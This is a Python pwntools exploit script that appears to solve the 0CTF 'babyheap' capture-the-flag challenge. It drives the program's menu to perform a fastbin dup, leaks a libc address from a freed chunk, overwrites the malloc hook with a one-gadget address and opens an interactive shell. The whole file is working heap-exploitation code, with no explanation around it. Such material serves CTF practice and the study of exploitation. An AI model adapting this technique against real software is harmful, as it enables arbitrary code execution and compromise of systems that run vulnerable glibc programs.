#!/usr/bin/python
from pwn import *
import code

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
elf = ELF('0ctfbabyheap')

libc_base_off = 0x00007f4988958000 - 0x00007f4988d1cb78
hook_off = 0x7ffff7dd1b10 - 0x00007ffff7a0d000
if local:
	libc = ELF('libc.so.6')
	p = process('./0ctfbabyheap')        
#        gdb.attach(p)
else:
	libc = ELF()
	p = remote()

def alloc(n):
    p.sendline('1')
    p.sendline(str(n))

def fill(i, n, msg):
    p.sendline('2')
    p.sendline(str(i))
    p.sendline(str(n))
    p.sendline(msg)

def free(i):
    p.sendline('3')
    p.sendline(str(i))

def dump(i):
    p.sendline('4')
    p.sendline(str(i))

#fastbin dup
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x100)

free(2)
free(1)

payload = 'a' * 0x20
payload += p64(0) + p64(0x31)
payload += '\xc0'
fill(0, len(payload), payload)

payload = 'a' * 0x20
payload += p64(0) + p64(0x31)
fill(3, len(payload), payload)

alloc(0x20)
alloc(0x20)

payload = 'a' * 0x20
payload += p64(0) + p64(0x111)
fill(3, len(payload), payload)

alloc(0x100)

free(4)

p.clean(1)

dump(2)
a = p.recvuntil('Content: ')
p.recv(1)
leak = p.recv(6)
heaplic = u64(leak.ljust(8, '\x00'))
log.info('heap lic:' + hex(heaplic))
libc_base = libc_base_off + heaplic

alloc(0x60)
alloc(0x60)

free(6)

payload = 'a' * 0x60
payload += p64(0) + p64(0x71) + p64(libc_base+hook_off-24+5)
fill(4, len(payload), payload)

alloc(0x60)
alloc(0x60)

payload = 'a' * 3
payload += p64(libc_base+0x4526a)
fill(7, len(payload), payload)
p.interactive()
#leak
#fastbin dup
#overwrite

